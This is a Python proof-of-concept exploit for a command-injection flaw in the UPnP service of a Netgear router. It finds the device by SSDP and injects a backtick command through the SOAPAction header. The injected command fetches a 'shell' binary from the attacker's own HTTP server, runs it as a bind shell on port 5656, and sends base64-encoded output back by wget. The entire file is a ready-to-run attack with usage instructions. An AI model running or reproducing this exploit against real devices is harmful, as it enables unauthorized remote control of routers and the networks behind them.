import socket
import re
from bs4 import BeautifulSoup
import requests
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler
import sys

HTTP_PORT = 8000
IP = "192.168.1.2"

def run_http():
    httpd = HTTPServer((IP, HTTP_PORT), SimpleHTTPRequestHandler)
    httpd.serve_forever()

def find_discovery_url():
    URL_REGEX = b"Location: (http://[^\r\n]*)"

    msg = \
        'M-SEARCH * HTTP/1.1\r\n' \
        'HOST:239.255.255.250:1900\r\n' \
        'ST:upnp:rootdevice\r\n' \
        'MX:2\r\n' \
        'MAN:"ssdp:discover"\r\n' \
        '\r\n'
    msg = msg.encode()


    # Set up UDP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    # bind to the correct interface
    s.bind((IP, 0))
    s.settimeout(2)
    s.sendto(msg, ('239.255.255.250', 1900) )

    url = None
    try:
        while True:
            data, addr = s.recvfrom(65507)
            if b"dyndev" in data:
                search = re.search(URL_REGEX, data)
                if search:
                    url = search.group(1).decode()
                    break
    except socket.timeout:
        pass
    return url

def parse_xml_definition(discovery_url):
    ret = {}
    req = requests.get(discovery_url)
    soup = BeautifulSoup(req.text, "lxml")
    root = soup.find("root")
    urlbase = soup.find("urlbase")
    ret["urlbase"] = urlbase.text
    ret["ctl"] = []
    for url in root.findAll("controlurl", recursive = True):
        ret["ctl"] = ret["ctl"] + [url.text]

    return ret

def post_payload(target_ip, target_port, url, injection):
    # Expected value for url: "/uuid:2169fac2-905d-49a4-9312-d92f0836ab35/Layer3Forwarding:1'"
    payload = f"""POST {url} HTTP/1.1
Content-Length: 271
Content-Type: text/xml
SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#{injection}\"
Connection: Close
Cache-Control: no-cache
Pragma: no-cache

<?xml version=\"1.0\"?>\n<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:GetStatusInfo xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"></u:GetStatusInfo></s:Body></s:Envelope>


""".encode()
    # Set up UDP socket
    s = socket.socket()
    # bind to the correct interface
    s.bind((IP, 0))
    s.connect((target_ip, target_port))
    s.send(payload)
    while True:
        data = s.recv(4096)
        if len(data) == 0:
            break

def main():
    web = threading.Thread(target=run_http)
    web.start()

    discovery_url = find_discovery_url()
    if discovery_url is None:
        print(f"[!] Failed to find discovery url :( ")
        return
    print(f"[+] Found discovery_url: {discovery_url}")

    _, _, host, _, uuid = discovery_url.split("/")
    target_ip, target_port = host.split(":")
    print(f"[i] Host: {host}, UUID: {uuid}")
    print(f"[i] target_ip: {target_ip}, target_port: {target_port}")
    target_port = int(target_port)

    definitions = parse_xml_definition(discovery_url)
    if definitions is None:
        print(f"[!] Failed to read device definitions :( ")
        return

    # parsed target url
    target_url = None
    ctl_url = [ctl for ctl in definitions["ctl"] if "Layer3Forwarding" in ctl]
    if len(ctl_url) != 1:
        target_url = f"/{uuid}/Layer3Forwarding:1"
        print(f"[w] Using fallback target url {target_url}")
    else:
        target_url = ctl_url[0]
        print(f"[i] Using target url {target_url}")

    cmd = f"wget http://{IP}:{HTTP_PORT}/shell -O /tmp/shell;chmod +x /tmp/shell;/tmp/shell bind 5656 &"
    wrapper = f"wget http://{IP}:{HTTP_PORT}/?log=\"$({cmd} 2>&1 | base64)\""
    post_payload(target_ip, target_port, target_url, f"AddPortMapping`{wrapper}`")
    print("[i] Sent exploit")
    web.join()

def usage():
    print("""Netgear UPNP Command injection - V1.0.7.78

Preconditions:
    - The router has an active internet connection.
    - You have compiled a reverse or bind shell, and placed it in this directory as 'shell'.
      This POC uses an implant that can do both.

Usage:
    $ python3 upnp_exploit.py <attacker ip>

Results:
    Successful exploitation will open a bind shell on port 5656 by default.
""")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        usage()
    else:
        IP = sys.argv[1]
        main()

